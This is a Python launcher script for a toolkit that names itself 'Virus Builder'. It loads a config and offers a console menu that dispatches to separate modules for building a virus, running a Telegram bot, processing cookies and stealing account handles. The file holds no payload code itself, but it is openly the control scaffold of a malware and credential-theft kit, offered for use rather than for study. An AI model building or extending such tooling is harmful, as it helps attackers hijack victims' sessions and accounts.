#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Main Application - Python Version
Converted from main.js

This module provides the main application functionality for the virus builder.
"""

import os
import sys
import json
import asyncio
from pathlib import Path

class MainApp:
    """Main application class"""
    
    def __init__(self):
        self.app_name = "Virus Builder"
        self.version = "1.0.0"
        self.config = {}
        self.modules = {}
    
    def initialize(self):
        """Initialize the application"""
        print(f"Initializing {self.app_name} v{self.version}")
        
        # Load configuration
        self.load_config()
        
        # Initialize modules
        self.initialize_modules()
        
        print("Application initialized successfully")
    
    def load_config(self):
        """Load application configuration"""
        try:
            config_file = "config.json"
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
            else:
                # Default configuration
                self.config = {
                    "app_name": self.app_name,
                    "version": self.version,
                    "debug": False,
                    "modules": {
                        "virus_builder": True,
                        "telegram_bot": True,
                        "cookie_processor": True,
                        "handle_stealer": True
                    }
                }
                self.save_config()
        except Exception as e:
            print(f"Error loading configuration: {e}")
            self.config = {}
    
    def save_config(self):
        """Save application configuration"""
        try:
            with open("config.json", 'w') as f:
                json.dump(self.config, f, indent=2)
        except Exception as e:
            print(f"Error saving configuration: {e}")
    
    def initialize_modules(self):
        """Initialize application modules"""
        try:
            # Import and initialize modules based on configuration
            if self.config.get("modules", {}).get("virus_builder", True):
                self.modules["virus_builder"] = self.import_module("virusBuilder")
            
            if self.config.get("modules", {}).get("telegram_bot", True):
                self.modules["telegram_bot"] = self.import_module("telegram_virus_bot")
            
            if self.config.get("modules", {}).get("cookie_processor", True):
                self.modules["cookie_processor"] = self.import_module("cookie_processor")
            
            if self.config.get("modules", {}).get("handle_stealer", True):
                self.modules["handle_stealer"] = self.import_module("handle_stealer")
            
            print(f"Initialized {len(self.modules)} modules")
            
        except Exception as e:
            print(f"Error initializing modules: {e}")
    
    def import_module(self, module_name):
        """Import a module dynamically"""
        try:
            # Try to import the module
            module = __import__(module_name)
            return module
        except ImportError as e:
            print(f"Error importing module {module_name}: {e}")
            return None
    
    def run(self):
        """Run the main application"""
        try:
            print(f"\n{self.app_name} is running...")
            print("Available commands:")
            print("1. Build Virus")
            print("2. Start Telegram Bot")
            print("3. Process Cookies")
            print("4. Steal Handles")
            print("5. Exit")
            
            while True:
                try:
                    choice = input("\nEnter your choice (1-5): ").strip()
                    
                    if choice == "1":
                        self.run_virus_builder()
                    elif choice == "2":
                        self.run_telegram_bot()
                    elif choice == "3":
                        self.run_cookie_processor()
                    elif choice == "4":
                        self.run_handle_stealer()
                    elif choice == "5":
                        print("Exiting application...")
                        break
                    else:
                        print("Invalid choice. Please enter 1-5.")
                        
                except KeyboardInterrupt:
                    print("\nExiting application...")
                    break
                except Exception as e:
                    print(f"Error: {e}")
                    
        except Exception as e:
            print(f"Application error: {e}")
    
    def run_virus_builder(self):
        """Run the virus builder module"""
        try:
            if "virus_builder" in self.modules and self.modules["virus_builder"]:
                print("Starting Virus Builder...")
                # Import and run the virus builder
                from virusBuilder import main as virus_builder_main
                virus_builder_main()
            else:
                print("Virus Builder module not available")
        except Exception as e:
            print(f"Error running virus builder: {e}")
    
    def run_telegram_bot(self):
        """Run the telegram bot module"""
        try:
            if "telegram_bot" in self.modules and self.modules["telegram_bot"]:
                print("Starting Telegram Bot...")
                # Import and run the telegram bot
                from telegram_virus_bot import main as telegram_bot_main
                telegram_bot_main()
            else:
                print("Telegram Bot module not available")
        except Exception as e:
            print(f"Error running telegram bot: {e}")
    
    def run_cookie_processor(self):
        """Run the cookie processor module"""
        try:
            if "cookie_processor" in self.modules and self.modules["cookie_processor"]:
                print("Starting Cookie Processor...")
                # Import and run the cookie processor
                from cookie_processor import main as cookie_processor_main
                cookie_processor_main()
            else:
                print("Cookie Processor module not available")
        except Exception as e:
            print(f"Error running cookie processor: {e}")
    
    def run_handle_stealer(self):
        """Run the handle stealer module"""
        try:
            if "handle_stealer" in self.modules and self.modules["handle_stealer"]:
                print("Starting Handle Stealer...")
                # Import and run the handle stealer
                from handle_stealer import main as handle_stealer_main
                handle_stealer_main()
            else:
                print("Handle Stealer module not available")
        except Exception as e:
            print(f"Error running handle stealer: {e}")
    
    def get_status(self):
        """Get application status"""
        status = {
            "app_name": self.app_name,
            "version": self.version,
            "config_loaded": bool(self.config),
            "modules_loaded": len(self.modules),
            "modules": list(self.modules.keys())
        }
        return status
    
    def shutdown(self):
        """Shutdown the application"""
        print("Shutting down application...")
        # Cleanup code here
        print("Application shutdown complete")

def main():
    """Main entry point"""
    try:
        app = MainApp()
        app.initialize()
        app.run()
    except KeyboardInterrupt:
        print("\nApplication interrupted by user")
    except Exception as e:
        print(f"Application error: {e}")
    finally:
        if 'app' in locals():
            app.shutdown()

if __name__ == "__main__":
    main()